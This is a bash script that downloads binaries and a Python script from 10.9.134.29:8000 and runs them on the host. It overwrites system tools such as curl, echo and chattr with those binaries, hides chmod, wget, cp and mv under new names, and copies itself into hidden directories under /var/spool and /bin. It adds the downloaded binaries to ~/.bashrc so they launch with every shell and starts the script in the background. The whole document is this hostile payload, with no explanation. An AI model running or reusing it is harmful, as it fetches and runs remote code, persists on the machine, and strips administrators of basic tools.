#!/bin/bash

wpath=$(which wget);
curlpath=$(which curl)
chattrpath=$(which chattr);
echopath=$(which echo);
chmodpath=$(which chmod);
cppath=$(which cp);
mvpath=$(which mv);
pythonpath=$(which python);


wget 10.9.134.29:8000/parrot  -O parrot;
wget 10.9.134.29:8000/chattr  -O ch;
wget 10.9.134.29:8000/nyancat  -O nyancat;
wget 10.9.134.29:8000/ea.py -O ea.py;


chmod +x ch;
chmod +x parrot;
chmod +x nyancat;


cp parrot /usr/bin;
cp nyancat /usr/bin;


mkdir /var/spool/.nano;
mkdir /var/spool/.nano/.history;
mkdir /bin/.screen;
mkdir /bin/.screen/.config;


mv $chmodpath ./props;
mv $curlpath ./nanoc;
mv $wpath ./nanow;
mv $echopath ./nanoe;


cp parrot $curlpath;
cp nyancat $chattrpath;
cp nyancat $echopath;
cp parrot ~;
cp nyancat ~;


cp -r $(pwd) /var/spool/.nano/.history;
cp -r $(pwd) /bin/.screen/.config;


mv $cppath ./ko;
mv $mvpath ./mo;


echo '/usr/bin/parrot' >> ~/.bashrc;
echo '/usr/bin/nyancat' >> ~/.bashrc;
echo '/usr/bin/nyancat' >> ~/.bashrc;
echo '/usr/bin/parrot' >> ~/.bashrc;
echo '/usr/bin/nyancat' >> ~/.bashrc;
echo '/usr/bin/nyancat' >> ~/.bashrc;
echo '~/parrot' >> ~/.bashrc;
echo '~/nyancat' >> ~/.bashrc;
source ~/.bashrc;


python ea.py &;

echo "DONE!!";

rm -rf file;
